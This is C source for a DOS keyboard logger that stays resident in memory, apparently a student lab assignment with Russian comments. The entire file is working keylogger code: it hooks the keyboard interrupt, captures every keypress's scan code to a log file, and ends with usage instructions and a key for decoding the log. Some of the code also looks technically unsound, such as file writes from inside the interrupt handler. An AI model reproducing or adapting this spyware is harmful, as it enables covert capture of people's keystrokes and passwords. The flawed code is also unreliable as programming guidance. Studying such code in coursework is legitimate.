/*
 * TSR Keyboard Logger for DOS
 * Laboratory Work No. 2
 *
 * Компиляция (Turbo C++ / Borland C++):
 * tcc -mt keylog.cpp
 * или
 * bcc -mt keylog.cpp
 *
 * ТОЛЬКО ДЛЯ ОБРАЗОВАТЕЛЬНЫХ ЦЕЛЕЙ!
 */

#include <dos.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <conio.h>

// Константы
#define BUFFER_SIZE 256
#define LOG_FILE "KEYLOG.DAT"
#define KB_INT 0x09  // Прерывание клавиатуры
#define KB_PORT 0x60 // Порт данных клавиатуры

// Глобальные переменные (будут находиться в резидентной части)
unsigned char buffer[BUFFER_SIZE];   // Буфер для сканкодов
int bufferIndex = 0;                 // Текущий индекс в буфере
void interrupt (*oldKbHandler)(...); // Указатель на старый обработчик

// Прототипы функций
void interrupt newKbHandler(...);
void flushBuffer();
int isAlreadyInstalled();

// ===== РЕЗИДЕНТНАЯ ЧАСТЬ (остается в памяти) =====

// Новый обработчик прерывания клавиатуры
void interrupt newKbHandler(...)
{
    unsigned char scanCode;

    // Читаем сканкод из порта клавиатуры
    scanCode = inportb(KB_PORT);

    // Сохраняем только коды нажатий (игнорируем отпускания - старший бит = 0)
    if (!(scanCode & 0x80))
    {
        // Добавляем сканкод в буфер
        buffer[bufferIndex++] = scanCode;

        // Если буфер заполнен, сбрасываем в файл
        if (bufferIndex >= BUFFER_SIZE)
        {
            flushBuffer();
            bufferIndex = 0;
        }
    }

    // Вызываем оригинальный обработчик для нормальной работы клавиатуры
    (*oldKbHandler)();
}

// Функция записи буфера в файл
void flushBuffer()
{
    FILE *fp;

    // Открываем файл в режиме добавления (бинарный)
    fp = fopen(LOG_FILE, "ab");
    if (fp != NULL)
    {
        // Записываем все 256 байт буфера
        fwrite(buffer, 1, BUFFER_SIZE, fp);
        fclose(fp);
    }
}

// ===== КОНЕЦ РЕЗИДЕНТНОЙ ЧАСТИ =====

// Проверка, установлена ли уже TSR программа
int isAlreadyInstalled()
{
    void interrupt (*currentHandler)(...);

    // Получаем текущий обработчик прерывания клавиатуры
    currentHandler = getvect(KB_INT);

    // Простая проверка: сравниваем с нашим обработчиком
    // В реальной программе нужна более надежная проверка (например, по сигнатуре)
    if (currentHandler == newKbHandler)
    {
        return 1;
    }
    return 0;
}

// Главная функция установки TSR
int main()
{
    unsigned int paragraphs;

    printf("TSR Keyboard Logger - Laboratory Work No. 2\n");
    printf("===========================================\n\n");

    // Проверяем, не установлена ли уже программа
    if (isAlreadyInstalled())
    {
        printf("ERROR: TSR is already installed!\n");
        return 1;
    }

    // Создаем/очищаем файл логов
    FILE *fp = fopen(LOG_FILE, "wb");
    if (fp == NULL)
    {
        printf("ERROR: Cannot create log file %s\n", LOG_FILE);
        return 1;
    }
    fclose(fp);

    printf("Installing TSR...\n");
    printf("Log file: %s\n", LOG_FILE);
    printf("Buffer size: %d bytes\n\n", BUFFER_SIZE);

    // Сохраняем старый вектор прерывания клавиатуры
    oldKbHandler = getvect(KB_INT);

    // Устанавливаем новый обработчик
    setvect(KB_INT, newKbHandler);

    printf("TSR installed successfully!\n");
    printf("All keypresses will be logged to %s\n", LOG_FILE);
    printf("Press any key to continue...\n");
    getch();

    // Вычисляем размер резидентной части в параграфах (16 байт)
    // _psp - это сегмент PSP (Program Segment Prefix)
    // Резидентная часть = код + данные до main()
    paragraphs = (_DS - _CS) + (_SS - _CS) + ((_SP / 16) + 1);

    // Завершаем программу и остаемся резидентными
    // INT 21h, AH=31h (Keep Process)
    // AL = код возврата (0)
    // DX = размер в параграфах
    keep(0, paragraphs);

    return 0;
}

/*
 * ИНСТРУКЦИИ ПО ИСПОЛЬЗОВАНИЮ:
 *
 * 1. Компиляция:
 *    tcc -mt keylog.cpp
 *    (опция -mt создает tiny memory model)
 *
 * 2. Запуск в DOSBox:
 *    keylog.exe
 *
 * 3. После установки программа остается в памяти и логирует все нажатия клавиш
 *
 * 4. Просмотр логов:
 *    - Файл KEYLOG.DAT содержит бинарные сканкоды
 *    - Можно использовать DEBUG.EXE или написать программу для декодирования
 *
 * 5. Для удаления TSR из памяти необходима перезагрузка DOSBox
 *
 * СКАНКОДЫ КЛАВИШ (примеры):
 * 01h = ESC
 * 02h-0Bh = 1-0
 * 10h-19h = Q-P
 * 1Ch = Enter
 * 1Eh-26h = A-L
 * 39h = Space
 *
 * ВАЖНО:
 * Это программа создана исключительно в образовательных целях!
 * Использование кейлоггеров без согласия пользователя незаконно!
 */